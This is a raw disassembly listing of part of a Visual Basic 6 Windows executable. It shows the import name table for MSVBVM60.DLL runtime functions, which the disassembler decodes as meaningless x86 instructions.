  40567e:	00 80 3a 59 00 00    	add    %al,0x593a(%eax)
  405684:	4c                   	dec    %esp
  405685:	59                   	pop    %ecx
  405686:	00 00                	add    %al,(%eax)
  405688:	5e                   	pop    %esi
  405689:	59                   	pop    %ecx
  40568a:	00 00                	add    %al,(%eax)
  40568c:	6a 59                	push   $0x59
  40568e:	00 00                	add    %al,(%eax)
  405690:	78 59                	js     0x4056eb
  405692:	00 00                	add    %al,(%eax)
  405694:	37                   	aaa
  405695:	02 00                	add    (%eax),%al
  405697:	80 86 59 00 00 9c 59 	addb   $0x59,-0x63ffffa7(%esi)
  40569e:	00 00                	add    %al,(%eax)
  4056a0:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4056a1:	59                   	pop    %ecx
  4056a2:	00 00                	add    %al,(%eax)
  4056a4:	c2 59 00             	ret    $0x59
  4056a7:	00 d8                	add    %bl,%al
  4056a9:	59                   	pop    %ecx
  4056aa:	00 00                	add    %al,(%eax)
  4056ac:	ea 59 00 00 f8 59 00 	ljmp   $0x59,$0xf8000059
  4056b3:	00 13                	add    %dl,(%ebx)
  4056b5:	02 00                	add    (%eax),%al
  4056b7:	80 cc 02             	or     $0x2,%ah
  4056ba:	00 80 0a 5a 00 00    	add    %al,0x5a0a(%eax)
  4056c0:	1e                   	push   %ds
  4056c1:	5a                   	pop    %edx
  4056c2:	00 00                	add    %al,(%eax)
  4056c4:	30 5a 00             	xor    %bl,0x0(%edx)
  4056c7:	00 3e                	add    %bh,(%esi)
  4056c9:	5a                   	pop    %edx
  4056ca:	00 00                	add    %al,(%eax)
  4056cc:	48                   	dec    %eax
  4056cd:	5a                   	pop    %edx
  4056ce:	00 00                	add    %al,(%eax)
  4056d0:	5e                   	pop    %esi
  4056d1:	5a                   	pop    %edx
  4056d2:	00 00                	add    %al,(%eax)
  4056d4:	3a 02                	cmp    (%edx),%al
  4056d6:	00 80 6e 5a 00 00    	add    %al,0x5a6e(%eax)
  4056dc:	7e 5a                	jle    0x405738
  4056de:	00 00                	add    %al,(%eax)
  4056e0:	8a 5a 00             	mov    0x0(%edx),%bl
  4056e3:	00 9c 5a 00 00 ae 5a 	add    %bl,0x5aae0000(%edx,%ebx,2)
  4056ea:	00 00                	add    %al,(%eax)
  4056ec:	be 5a 00 00 40       	mov    $0x4000005a,%esi
  4056f1:	02 00                	add    (%eax),%al
  4056f3:	80 d2 5a             	adc    $0x5a,%dl
  4056f6:	00 00                	add    %al,(%eax)
  4056f8:	e4 5a                	in     $0x5a,%al
  4056fa:	00 00                	add    %al,(%eax)
  4056fc:	42                   	inc    %edx
  4056fd:	02 00                	add    (%eax),%al
  4056ff:	80 64 00 00 80       	andb   $0x80,0x0(%eax,%eax,1)
  405704:	f2 5a                	repnz pop %edx
  405706:	00 00                	add    %al,(%eax)
  405708:	02 5b 00             	add    0x0(%ebx),%bl
  40570b:	00 14 5b             	add    %dl,(%ebx,%ebx,2)
  40570e:	00 00                	add    %al,(%eax)
  405710:	28 5b 00             	sub    %bl,0x0(%ebx)
  405713:	00 69 02             	add    %ch,0x2(%ecx)
  405716:	00 80 36 5b 00 00    	add    %al,0x5b36(%eax)
  40571c:	40                   	inc    %eax
  40571d:	5b                   	pop    %ebx
  40571e:	00 00                	add    %al,(%eax)
  405720:	50                   	push   %eax
  405721:	5b                   	pop    %ebx
  405722:	00 00                	add    %al,(%eax)
  405724:	6b 02 00             	imul   $0x0,(%edx),%eax
  405727:	80 60 5b 00          	andb   $0x0,0x5b(%eax)
  40572b:	00 6a 5b             	add    %ch,0x5b(%edx)
  40572e:	00 00                	add    %al,(%eax)
  405730:	74 5b                	je     0x40578d
  405732:	00 00                	add    %al,(%eax)
  405734:	44                   	inc    %esp
  405735:	02 00                	add    (%eax),%al
  405737:	80 7e 5b 00          	cmpb   $0x0,0x5b(%esi)
  40573b:	00 8e 5b 00 00 00    	add    %cl,0x5b(%esi)
  405741:	00 00                	add    %al,(%eax)
  405743:	00 4d 53             	add    %cl,0x53(%ebp)
  405746:	56                   	push   %esi
  405747:	42                   	inc    %edx
  405748:	56                   	push   %esi
  405749:	4d                   	dec    %ebp
  40574a:	36 30 2e             	xor    %ch,%ss:(%esi)
  40574d:	44                   	inc    %esp
  40574e:	4c                   	dec    %esp
  40574f:	4c                   	dec    %esp
  405750:	00 00                	add    %al,(%eax)
  405752:	00 00                	add    %al,(%eax)
  405754:	5f                   	pop    %edi
  405755:	43                   	inc    %ebx
  405756:	49                   	dec    %ecx
  405757:	63 6f 73             	arpl   %ebp,0x73(%edi)
  40575a:	00 00                	add    %al,(%eax)
  40575c:	00 00                	add    %al,(%eax)
  40575e:	5f                   	pop    %edi
  40575f:	61                   	popa
  405760:	64 6a 5f             	fs push $0x5f
  405763:	66 70 74             	data16 jo 0x4057da
  405766:	61                   	popa
  405767:	6e                   	outsb  %ds:(%esi),(%dx)
  405768:	00 00                	add    %al,(%eax)
  40576a:	00 00                	add    %al,(%eax)
  40576c:	5f                   	pop    %edi
  40576d:	5f                   	pop    %edi
  40576e:	76 62                	jbe    0x4057d2
  405770:	61                   	popa
  405771:	56                   	push   %esi
  405772:	61                   	popa
  405773:	72 4d                	jb     0x4057c2
  405775:	6f                   	outsl  %ds:(%esi),(%dx)
  405776:	76 65                	jbe    0x4057dd
  405778:	00 00                	add    %al,(%eax)
  40577a:	00 00                	add    %al,(%eax)
  40577c:	5f                   	pop    %edi
  40577d:	5f                   	pop    %edi
  40577e:	76 62                	jbe    0x4057e2
  405780:	61                   	popa
  405781:	41                   	inc    %ecx
  405782:	72 79                	jb     0x4057fd
  405784:	4d                   	dec    %ebp
  405785:	6f                   	outsl  %ds:(%esi),(%dx)
  405786:	76 65                	jbe    0x4057ed
  405788:	00 00                	add    %al,(%eax)
  40578a:	00 00                	add    %al,(%eax)
  40578c:	5f                   	pop    %edi
  40578d:	5f                   	pop    %edi
  40578e:	76 62                	jbe    0x4057f2
  405790:	61                   	popa
  405791:	46                   	inc    %esi
  405792:	72 65                	jb     0x4057f9
  405794:	65 56                	gs push %esi
  405796:	61                   	popa
  405797:	72 00                	jb     0x405799
  405799:	00 00                	add    %al,(%eax)
  40579b:	00 5f 5f             	add    %bl,0x5f(%edi)
  40579e:	76 62                	jbe    0x405802
  4057a0:	61                   	popa
  4057a1:	4c                   	dec    %esp
  4057a2:	65 6e                	outsb  %gs:(%esi),(%dx)
  4057a4:	42                   	inc    %edx
  4057a5:	73 74                	jae    0x40581b
  4057a7:	72 00                	jb     0x4057a9
  4057a9:	00 00                	add    %al,(%eax)
  4057ab:	00 5f 5f             	add    %bl,0x5f(%edi)
  4057ae:	76 62                	jbe    0x405812
  4057b0:	61                   	popa
  4057b1:	53                   	push   %ebx
  4057b2:	74 72                	je     0x405826
  4057b4:	56                   	push   %esi
  4057b5:	61                   	popa
  4057b6:	72 4d                	jb     0x405805
  4057b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4057b9:	76 65                	jbe    0x405820
  4057bb:	00 00                	add    %al,(%eax)
  4057bd:	00 5f 5f             	add    %bl,0x5f(%edi)
  4057c0:	76 62                	jbe    0x405824
  4057c2:	61                   	popa
  4057c3:	46                   	inc    %esi
  4057c4:	72 65                	jb     0x40582b
  4057c6:	65 56                	gs push %esi
  4057c8:	61                   	popa
  4057c9:	72 4c                	jb     0x405817
  4057cb:	69 73 74 00 00 00 00 	imul   $0x0,0x74(%ebx),%esi
  4057d2:	5f                   	pop    %edi
  4057d3:	5f                   	pop    %edi
  4057d4:	76 62                	jbe    0x405838
  4057d6:	61                   	popa
  4057d7:	45                   	inc    %ebp
  4057d8:	6e                   	outsb  %ds:(%esi),(%dx)
  4057d9:	64 00 00             	add    %al,%fs:(%eax)
  4057dc:	00 00                	add    %al,(%eax)
  4057de:	5f                   	pop    %edi
  4057df:	61                   	popa
  4057e0:	64 6a 5f             	fs push $0x5f
  4057e3:	66 64 69 76 5f 6d 36 	imul   $0x366d,%fs:0x5f(%esi),%si
  4057ea:	34 00                	xor    $0x0,%al
  4057ec:	00 00                	add    %al,(%eax)
  4057ee:	5f                   	pop    %edi
  4057ef:	5f                   	pop    %edi
  4057f0:	76 62                	jbe    0x405854
  4057f2:	61                   	popa
  4057f3:	46                   	inc    %esi
  4057f4:	72 65                	jb     0x40585b
  4057f6:	65 4f                	gs dec %edi
  4057f8:	62 6a 4c             	bound  %ebp,0x4c(%edx)
  4057fb:	69 73 74 00 00 00 00 	imul   $0x0,0x74(%ebx),%esi
  405802:	5f                   	pop    %edi
  405803:	61                   	popa
  405804:	64 6a 5f             	fs push $0x5f
  405807:	66 70 72             	data16 jo 0x40587c
  40580a:	65 6d                	gs insl (%dx),%es:(%edi)
  40580c:	31 00                	xor    %eax,(%eax)
  40580e:	00 00                	add    %al,(%eax)
  405810:	5f                   	pop    %edi
  405811:	5f                   	pop    %edi
  405812:	76 62                	jbe    0x405876
  405814:	61                   	popa
  405815:	53                   	push   %ebx
  405816:	74 72                	je     0x40588a
  405818:	43                   	inc    %ebx
  405819:	61                   	popa
  40581a:	74 00                	je     0x40581c
  40581c:	00 00                	add    %al,(%eax)
  40581e:	5f                   	pop    %edi
  40581f:	5f                   	pop    %edi
  405820:	76 62                	jbe    0x405884
  405822:	61                   	popa
  405823:	48                   	dec    %eax
  405824:	72 65                	jb     0x40588b
  405826:	73 75                	jae    0x40589d
  405828:	6c                   	insb   (%dx),%es:(%edi)
  405829:	74 43                	je     0x40586e
  40582b:	68 65 63 6b 4f       	push   $0x4f6b6365
  405830:	62 6a 00             	bound  %ebp,0x0(%edx)
  405833:	00 00                	add    %al,(%eax)
  405835:	00 5f 61             	add    %bl,0x61(%edi)
  405838:	64 6a 5f             	fs push $0x5f
  40583b:	66 64 69 76 5f 6d 33 	imul   $0x336d,%fs:0x5f(%esi),%si
  405842:	32 00                	xor    (%eax),%al
  405844:	00 00                	add    %al,(%eax)
  405846:	5f                   	pop    %edi
  405847:	5f                   	pop    %edi
  405848:	76 62                	jbe    0x4058ac
  40584a:	61                   	popa
  40584b:	41                   	inc    %ecx
  40584c:	72 79                	jb     0x4058c7
  40584e:	44                   	inc    %esp
  40584f:	65 73 74             	gs jae 0x4058c6
  405852:	72 75                	jb     0x4058c9
  405854:	63 74 00 00          	arpl   %esi,0x0(%eax,%eax,1)
  405858:	00 00                	add    %al,(%eax)
  40585a:	5f                   	pop    %edi
  40585b:	5f                   	pop    %edi
  40585c:	76 62                	jbe    0x4058c0
  40585e:	61                   	popa
  40585f:	45                   	inc    %ebp
  405860:	78 69                	js     0x4058cb
  405862:	74 50                	je     0x4058b4
  405864:	72 6f                	jb     0x4058d5
  405866:	63 00                	arpl   %eax,(%eax)
  405868:	00 00                	add    %al,(%eax)
  40586a:	5f                   	pop    %edi
  40586b:	5f                   	pop    %edi
  40586c:	76 62                	jbe    0x4058d0
  40586e:	61                   	popa
  40586f:	46                   	inc    %esi
  405870:	6f                   	outsl  %ds:(%esi),(%dx)
  405871:	72 45                	jb     0x4058b8
  405873:	61                   	popa
  405874:	63 68 43             	arpl   %ebp,0x43(%eax)
  405877:	6f                   	outsl  %ds:(%esi),(%dx)
  405878:	6c                   	insb   (%dx),%es:(%edi)
  405879:	6c                   	insb   (%dx),%es:(%edi)
  40587a:	4f                   	dec    %edi
  40587b:	62 6a 00             	bound  %ebp,0x0(%edx)
  40587e:	00 00                	add    %al,(%eax)
  405880:	5f                   	pop    %edi
  405881:	5f                   	pop    %edi
  405882:	76 62                	jbe    0x4058e6
  405884:	61                   	popa
  405885:	4f                   	dec    %edi
  405886:	6e                   	outsb  %ds:(%esi),(%dx)
  405887:	45                   	inc    %ebp
  405888:	72 72                	jb     0x4058fc
  40588a:	6f                   	outsl  %ds:(%esi),(%dx)
  40588b:	72 00                	jb     0x40588d
  40588d:	00 00                	add    %al,(%eax)
  40588f:	00 5f 5f             	add    %bl,0x5f(%edi)
  405892:	76 62                	jbe    0x4058f6
  405894:	61                   	popa
  405895:	4f                   	dec    %edi
  405896:	62 6a 53             	bound  %ebp,0x53(%edx)
  405899:	65 74 00             	gs je  0x40589c
  40589c:	00 00                	add    %al,(%eax)
  40589e:	5f                   	pop    %edi
  40589f:	61                   	popa
  4058a0:	64 6a 5f             	fs push $0x5f
  4058a3:	66 64 69 76 5f 6d 31 	imul   $0x316d,%fs:0x5f(%esi),%si
  4058aa:	36 69 00 00 00 00 5f 	imul   $0x5f000000,%ss:(%eax),%eax
  4058b1:	5f                   	pop    %edi
  4058b2:	76 62                	jbe    0x405916
  4058b4:	61                   	popa
  4058b5:	4f                   	dec    %edi
  4058b6:	62 6a 53             	bound  %ebp,0x53(%edx)
  4058b9:	65 74 41             	gs je  0x4058fd
  4058bc:	64 64 72 65          	fs fs jb 0x405925
  4058c0:	66 00 00             	data16 add %al,(%eax)
  4058c3:	00 5f 61             	add    %bl,0x61(%edi)
  4058c6:	64 6a 5f             	fs push $0x5f
  4058c9:	66 64 69 76 72 5f 6d 	imul   $0x6d5f,%fs:0x72(%esi),%si
  4058d0:	31 36                	xor    %esi,(%esi)
  4058d2:	69 00 00 00 5f 5f    	imul   $0x5f5f0000,(%eax),%eax
  4058d8:	76 62                	jbe    0x40593c
  4058da:	61                   	popa
  4058db:	56                   	push   %esi
  4058dc:	61                   	popa
  4058dd:	72 54                	jb     0x405933
  4058df:	73 74                	jae    0x405955
  4058e1:	4c                   	dec    %esp
  4058e2:	74 00                	je     0x4058e4
  4058e4:	00 00                	add    %al,(%eax)
  4058e6:	5f                   	pop    %edi
  4058e7:	43                   	inc    %ebx
  4058e8:	49                   	dec    %ecx
  4058e9:	73 69                	jae    0x405954
  4058eb:	6e                   	outsb  %ds:(%esi),(%dx)
  4058ec:	00 00                	add    %al,(%eax)
  4058ee:	00 00                	add    %al,(%eax)
  4058f0:	5f                   	pop    %edi
  4058f1:	5f                   	pop    %edi
  4058f2:	76 62                	jbe    0x405956
  4058f4:	61                   	popa
  4058f5:	4e                   	dec    %esi
  4058f6:	65 78 74             	gs js  0x40596d
  4058f9:	45                   	inc    %ebp
  4058fa:	61                   	popa
  4058fb:	63 68 43             	arpl   %ebp,0x43(%eax)
  4058fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4058ff:	6c                   	insb   (%dx),%es:(%edi)
  405900:	6c                   	insb   (%dx),%es:(%edi)
  405901:	4f                   	dec    %edi
  405902:	62 6a 00             	bound  %ebp,0x0(%edx)
  405905:	00 00                	add    %al,(%eax)
  405907:	00 5f 5f             	add    %bl,0x5f(%edi)
  40590a:	76 62                	jbe    0x40596e
  40590c:	61                   	popa
  40590d:	43                   	inc    %ebx
  40590e:	68 6b 73 74 6b       	push   $0x6b74736b
  405913:	00 00                	add    %al,(%eax)
  405915:	00 5f 5f             	add    %bl,0x5f(%edi)
  405918:	76 62                	jbe    0x40597c
  40591a:	61                   	popa
  40591b:	46                   	inc    %esi
  40591c:	69 6c 65 43 6c 6f 73 	imul   $0x65736f6c,0x43(%ebp,%eiz,2),%ebp
  405923:	65 
  405924:	00 00                	add    %al,(%eax)
  405926:	00 00                	add    %al,(%eax)
  405928:	45                   	inc    %ebp
  405929:	56                   	push   %esi
  40592a:	45                   	inc    %ebp
  40592b:	4e                   	dec    %esi
  40592c:	54                   	push   %esp
  40592d:	5f                   	pop    %edi
  40592e:	53                   	push   %ebx
  40592f:	49                   	dec    %ecx
  405930:	4e                   	dec    %esi
  405931:	4b                   	dec    %ebx
  405932:	5f                   	pop    %edi
  405933:	41                   	inc    %ecx
  405934:	64 64 52             	fs fs push %edx
  405937:	65 66 00 00          	data16 add %al,%gs:(%eax)
  40593b:	00 5f 5f             	add    %bl,0x5f(%edi)
  40593e:	76 62                	jbe    0x4059a2
  405940:	61                   	popa
  405941:	50                   	push   %eax
  405942:	75 74                	jne    0x4059b8
  405944:	4f                   	dec    %edi
  405945:	77 6e                	ja     0x4059b5
  405947:	65 72 33             	gs jb  0x40597d
  40594a:	00 00                	add    %al,(%eax)
  40594c:	00 00                	add    %al,(%eax)
  40594e:	5f                   	pop    %edi
  40594f:	5f                   	pop    %edi
  405950:	76 62                	jbe    0x4059b4
  405952:	61                   	popa
  405953:	50                   	push   %eax
  405954:	75 74                	jne    0x4059ca
  405956:	4f                   	dec    %edi
  405957:	77 6e                	ja     0x4059c7
  405959:	65 72 34             	gs jb  0x405990
  40595c:	00 00                	add    %al,(%eax)
  40595e:	00 00                	add    %al,(%eax)
  405960:	5f                   	pop    %edi
  405961:	5f                   	pop    %edi
  405962:	76 62                	jbe    0x4059c6
  405964:	61                   	popa
  405965:	49                   	dec    %ecx
  405966:	32 49 34             	xor    0x34(%ecx),%cl
  405969:	00 00                	add    %al,(%eax)
  40596b:	00 5f 5f             	add    %bl,0x5f(%edi)
  40596e:	76 62                	jbe    0x4059d2
  405970:	61                   	popa
  405971:	4f                   	dec    %edi
  405972:	62 6a 56             	bound  %ebp,0x56(%edx)
  405975:	61                   	popa
  405976:	72 00                	jb     0x405978
  405978:	00 00                	add    %al,(%eax)
  40597a:	5f                   	pop    %edi
  40597b:	61                   	popa
  40597c:	64 6a 5f             	fs push $0x5f
  40597f:	66 70 61             	data16 jo 0x4059e3
  405982:	74 61                	je     0x4059e5
  405984:	6e                   	outsb  %ds:(%esi),(%dx)
  405985:	00 00                	add    %al,(%eax)
  405987:	00 45 56             	add    %al,0x56(%ebp)
  40598a:	45                   	inc    %ebp
  40598b:	4e                   	dec    %esi
  40598c:	54                   	push   %esp
  40598d:	5f                   	pop    %edi
  40598e:	53                   	push   %ebx
  40598f:	49                   	dec    %ecx
  405990:	4e                   	dec    %esi
  405991:	4b                   	dec    %ebx
  405992:	5f                   	pop    %edi
  405993:	52                   	push   %edx
  405994:	65 6c                	gs insb (%dx),%es:(%edi)
  405996:	65 61                	gs popa
  405998:	73 65                	jae    0x4059ff
  40599a:	00 00                	add    %al,(%eax)
  40599c:	00 00                	add    %al,(%eax)
  40599e:	5f                   	pop    %edi
  40599f:	43                   	inc    %ebx
  4059a0:	49                   	dec    %ecx
  4059a1:	73 71                	jae    0x405a14
  4059a3:	72 74                	jb     0x405a19
  4059a5:	00 00                	add    %al,(%eax)
  4059a7:	00 45 56             	add    %al,0x56(%ebp)
  4059aa:	45                   	inc    %ebp
  4059ab:	4e                   	dec    %esi
  4059ac:	54                   	push   %esp
  4059ad:	5f                   	pop    %edi
  4059ae:	53                   	push   %ebx
  4059af:	49                   	dec    %ecx
  4059b0:	4e                   	dec    %esi
  4059b1:	4b                   	dec    %ebx
  4059b2:	5f                   	pop    %edi
  4059b3:	51                   	push   %ecx
  4059b4:	75 65                	jne    0x405a1b
  4059b6:	72 79                	jb     0x405a31
  4059b8:	49                   	dec    %ecx
  4059b9:	6e                   	outsb  %ds:(%esi),(%dx)
  4059ba:	74 65                	je     0x405a21
  4059bc:	72 66                	jb     0x405a24
  4059be:	61                   	popa
  4059bf:	63 65 00             	arpl   %esp,0x0(%ebp)
  4059c2:	00 00                	add    %al,(%eax)
  4059c4:	5f                   	pop    %edi
  4059c5:	5f                   	pop    %edi
  4059c6:	76 62                	jbe    0x405a2a
  4059c8:	61                   	popa
  4059c9:	45                   	inc    %ebp
  4059ca:	78 63                	js     0x405a2f
  4059cc:	65 70 74             	gs jo  0x405a43
  4059cf:	48                   	dec    %eax
  4059d0:	61                   	popa
  4059d1:	6e                   	outsb  %ds:(%esi),(%dx)
  4059d2:	64 6c                	fs insb (%dx),%es:(%edi)
  4059d4:	65 72 00             	gs jb  0x4059d7
  4059d7:	00 00                	add    %al,(%eax)
  4059d9:	00 5f 5f             	add    %bl,0x5f(%edi)
  4059dc:	76 62                	jbe    0x405a40
  4059de:	61                   	popa
  4059df:	50                   	push   %eax
  4059e0:	72 69                	jb     0x405a4b
  4059e2:	6e                   	outsb  %ds:(%esi),(%dx)
  4059e3:	74 46                	je     0x405a2b
  4059e5:	69 6c 65 00 00 00 00 	imul   $0x5f000000,0x0(%ebp,%eiz,2),%ebp
  4059ec:	5f 
  4059ed:	61                   	popa
  4059ee:	64 6a 5f             	fs push $0x5f
  4059f1:	66 70 72             	data16 jo 0x405a66
  4059f4:	65 6d                	gs insl (%dx),%es:(%edi)
  4059f6:	00 00                	add    %al,(%eax)
  4059f8:	00 00                	add    %al,(%eax)
  4059fa:	5f                   	pop    %edi
  4059fb:	61                   	popa
  4059fc:	64 6a 5f             	fs push $0x5f
  4059ff:	66 64 69 76 72 5f 6d 	imul   $0x6d5f,%fs:0x72(%esi),%si
  405a06:	36 34 00             	ss xor $0x0,%al
  405a09:	00 00                	add    %al,(%eax)
  405a0b:	00 5f 5f             	add    %bl,0x5f(%edi)
  405a0e:	76 62                	jbe    0x405a72
  405a10:	61                   	popa
  405a11:	46                   	inc    %esi
  405a12:	50                   	push   %eax
  405a13:	45                   	inc    %ebp
  405a14:	78 63                	js     0x405a79
  405a16:	65 70 74             	gs jo  0x405a8d
  405a19:	69 6f 6e 00 00 00 00 	imul   $0x0,0x6e(%edi),%ebp
  405a20:	5f                   	pop    %edi
  405a21:	5f                   	pop    %edi
  405a22:	76 62                	jbe    0x405a86
  405a24:	61                   	popa
  405a25:	53                   	push   %ebx
  405a26:	74 72                	je     0x405a9a
  405a28:	56                   	push   %esi
  405a29:	61                   	popa
  405a2a:	72 56                	jb     0x405a82
  405a2c:	61                   	popa
  405a2d:	6c                   	insb   (%dx),%es:(%edi)
  405a2e:	00 00                	add    %al,(%eax)
  405a30:	00 00                	add    %al,(%eax)
  405a32:	5f                   	pop    %edi
  405a33:	5f                   	pop    %edi
  405a34:	76 62                	jbe    0x405a98
  405a36:	61                   	popa
  405a37:	56                   	push   %esi
  405a38:	61                   	popa
  405a39:	72 43                	jb     0x405a7e
  405a3b:	61                   	popa
  405a3c:	74 00                	je     0x405a3e
  405a3e:	00 00                	add    %al,(%eax)
  405a40:	5f                   	pop    %edi
  405a41:	43                   	inc    %ebx
  405a42:	49                   	dec    %ecx
  405a43:	6c                   	insb   (%dx),%es:(%edi)
  405a44:	6f                   	outsl  %ds:(%esi),(%dx)
  405a45:	67 00 00             	add    %al,(%bx,%si)
  405a48:	00 00                	add    %al,(%eax)
  405a4a:	5f                   	pop    %edi
  405a4b:	5f                   	pop    %edi
  405a4c:	76 62                	jbe    0x405ab0
  405a4e:	61                   	popa
  405a4f:	45                   	inc    %ebp
  405a50:	72 72                	jb     0x405ac4
  405a52:	6f                   	outsl  %ds:(%esi),(%dx)
  405a53:	72 4f                	jb     0x405aa4
  405a55:	76 65                	jbe    0x405abc
  405a57:	72 66                	jb     0x405abf
  405a59:	6c                   	insb   (%dx),%es:(%edi)
  405a5a:	6f                   	outsl  %ds:(%esi),(%dx)
  405a5b:	77 00                	ja     0x405a5d
  405a5d:	00 00                	add    %al,(%eax)
  405a5f:	00 5f 5f             	add    %bl,0x5f(%edi)
  405a62:	76 62                	jbe    0x405ac6
  405a64:	61                   	popa
  405a65:	46                   	inc    %esi
  405a66:	69 6c 65 4f 70 65 6e 	imul   $0x6e6570,0x4f(%ebp,%eiz,2),%ebp
  405a6d:	00 
  405a6e:	00 00                	add    %al,(%eax)
  405a70:	5f                   	pop    %edi
  405a71:	5f                   	pop    %edi
  405a72:	76 62                	jbe    0x405ad6
  405a74:	61                   	popa
  405a75:	56                   	push   %esi
  405a76:	61                   	popa
  405a77:	72 32                	jb     0x405aab
  405a79:	56                   	push   %esi
  405a7a:	65 63 00             	arpl   %eax,%gs:(%eax)
  405a7d:	00 00                	add    %al,(%eax)
  405a7f:	00 5f 5f             	add    %bl,0x5f(%edi)
  405a82:	76 62                	jbe    0x405ae6
  405a84:	61                   	popa
  405a85:	4e                   	dec    %esi
  405a86:	65 77 32             	gs ja  0x405abb
  405a89:	00 00                	add    %al,(%eax)
  405a8b:	00 5f 61             	add    %bl,0x61(%edi)
  405a8e:	64 6a 5f             	fs push $0x5f
  405a91:	66 64 69 76 5f 6d 33 	imul   $0x336d,%fs:0x5f(%esi),%si
  405a98:	32 69 00             	xor    0x0(%ecx),%ch
  405a9b:	00 00                	add    %al,(%eax)
  405a9d:	00 5f 61             	add    %bl,0x61(%edi)
  405aa0:	64 6a 5f             	fs push $0x5f
  405aa3:	66 64 69 76 72 5f 6d 	imul   $0x6d5f,%fs:0x72(%esi),%si
  405aaa:	33 32                	xor    (%edx),%esi
  405aac:	69 00 00 00 5f 5f    	imul   $0x5f5f0000,(%eax),%eax
  405ab2:	76 62                	jbe    0x405b16
  405ab4:	61                   	popa
  405ab5:	53                   	push   %ebx
  405ab6:	74 72                	je     0x405b2a
  405ab8:	43                   	inc    %ebx
  405ab9:	6f                   	outsl  %ds:(%esi),(%dx)
  405aba:	70 79                	jo     0x405b35
  405abc:	00 00                	add    %al,(%eax)
  405abe:	00 00                	add    %al,(%eax)
  405ac0:	5f                   	pop    %edi
  405ac1:	5f                   	pop    %edi
  405ac2:	76 62                	jbe    0x405b26
  405ac4:	61                   	popa
  405ac5:	46                   	inc    %esi
  405ac6:	72 65                	jb     0x405b2d
  405ac8:	65 53                	gs push %ebx
  405aca:	74 72                	je     0x405b3e
  405acc:	4c                   	dec    %esp
  405acd:	69 73 74 00 00 00 00 	imul   $0x0,0x74(%ebx),%esi
  405ad4:	5f                   	pop    %edi
  405ad5:	61                   	popa
  405ad6:	64 6a 5f             	fs push $0x5f
  405ad9:	66 64 69 76 72 5f 6d 	imul   $0x6d5f,%fs:0x72(%esi),%si
  405ae0:	33 32                	xor    (%edx),%esi
  405ae2:	00 00                	add    %al,(%eax)
  405ae4:	00 00                	add    %al,(%eax)
  405ae6:	5f                   	pop    %edi
  405ae7:	61                   	popa
  405ae8:	64 6a 5f             	fs push $0x5f
  405aeb:	66 64 69 76 5f 72 00 	imul   $0x72,%fs:0x5f(%esi),%si
  405af2:	00 00                	add    %al,(%eax)
  405af4:	5f                   	pop    %edi
  405af5:	5f                   	pop    %edi
  405af6:	76 62                	jbe    0x405b5a
  405af8:	61                   	popa
  405af9:	56                   	push   %esi
  405afa:	61                   	popa
  405afb:	72 54                	jb     0x405b51
  405afd:	73 74                	jae    0x405b73
  405aff:	4e                   	dec    %esi
  405b00:	65 00 00             	add    %al,%gs:(%eax)
  405b03:	00 5f 5f             	add    %bl,0x5f(%edi)
  405b06:	76 62                	jbe    0x405b6a
  405b08:	61                   	popa
  405b09:	56                   	push   %esi
  405b0a:	61                   	popa
  405b0b:	72 53                	jb     0x405b60
  405b0d:	65 74 56             	gs je  0x405b66
  405b10:	61                   	popa
  405b11:	72 00                	jb     0x405b13
  405b13:	00 00                	add    %al,(%eax)
  405b15:	00 5f 5f             	add    %bl,0x5f(%edi)
  405b18:	76 62                	jbe    0x405b7c
  405b1a:	61                   	popa
  405b1b:	4c                   	dec    %esp
  405b1c:	61                   	popa
  405b1d:	74 65                	je     0x405b84
  405b1f:	4d                   	dec    %ebp
  405b20:	65 6d                	gs insl (%dx),%es:(%edi)
  405b22:	43                   	inc    %ebx
  405b23:	61                   	popa
  405b24:	6c                   	insb   (%dx),%es:(%edi)
  405b25:	6c                   	insb   (%dx),%es:(%edi)
  405b26:	00 00                	add    %al,(%eax)
  405b28:	00 00                	add    %al,(%eax)
  405b2a:	5f                   	pop    %edi
  405b2b:	5f                   	pop    %edi
  405b2c:	76 62                	jbe    0x405b90
  405b2e:	61                   	popa
  405b2f:	56                   	push   %esi
  405b30:	61                   	popa
  405b31:	72 44                	jb     0x405b77
  405b33:	75 70                	jne    0x405ba5
  405b35:	00 00                	add    %al,(%eax)
  405b37:	00 5f 43             	add    %bl,0x43(%edi)
  405b3a:	49                   	dec    %ecx
  405b3b:	61                   	popa
  405b3c:	74 61                	je     0x405b9f
  405b3e:	6e                   	outsb  %ds:(%esi),(%dx)
  405b3f:	00 00                	add    %al,(%eax)
  405b41:	00 5f 5f             	add    %bl,0x5f(%edi)
  405b44:	76 62                	jbe    0x405ba8
  405b46:	61                   	popa
  405b47:	53                   	push   %ebx
  405b48:	74 72                	je     0x405bbc
  405b4a:	4d                   	dec    %ebp
  405b4b:	6f                   	outsl  %ds:(%esi),(%dx)
  405b4c:	76 65                	jbe    0x405bb3
  405b4e:	00 00                	add    %al,(%eax)
  405b50:	00 00                	add    %al,(%eax)
  405b52:	5f                   	pop    %edi
  405b53:	5f                   	pop    %edi
  405b54:	76 62                	jbe    0x405bb8
  405b56:	61                   	popa
  405b57:	43                   	inc    %ebx
  405b58:	61                   	popa
  405b59:	73 74                	jae    0x405bcf
  405b5b:	4f                   	dec    %edi
  405b5c:	62 6a 00             	bound  %ebp,0x0(%edx)
  405b5f:	00 00                	add    %al,(%eax)
  405b61:	00 5f 61             	add    %bl,0x61(%edi)
  405b64:	6c                   	insb   (%dx),%es:(%edi)
  405b65:	6c                   	insb   (%dx),%es:(%edi)
  405b66:	6d                   	insl   (%dx),%es:(%edi)
  405b67:	75 6c                	jne    0x405bd5
  405b69:	00 00                	add    %al,(%eax)
  405b6b:	00 5f 43             	add    %bl,0x43(%edi)
  405b6e:	49                   	dec    %ecx
  405b6f:	74 61                	je     0x405bd2
  405b71:	6e                   	outsb  %ds:(%esi),(%dx)
  405b72:	00 00                	add    %al,(%eax)
  405b74:	00 00                	add    %al,(%eax)
  405b76:	5f                   	pop    %edi
  405b77:	43                   	inc    %ebx
  405b78:	49                   	dec    %ecx
  405b79:	65 78 70             	gs js  0x405bec
  405b7c:	00 00                	add    %al,(%eax)
  405b7e:	00 00                	add    %al,(%eax)
  405b80:	5f                   	pop    %edi
  405b81:	5f                   	pop    %edi
  405b82:	76 62                	jbe    0x405be6
  405b84:	61                   	popa
  405b85:	46                   	inc    %esi
  405b86:	72 65                	jb     0x405bed
  405b88:	65 53                	gs push %ebx
  405b8a:	74 72                	je     0x405bfe
  405b8c:	00 00                	add    %al,(%eax)
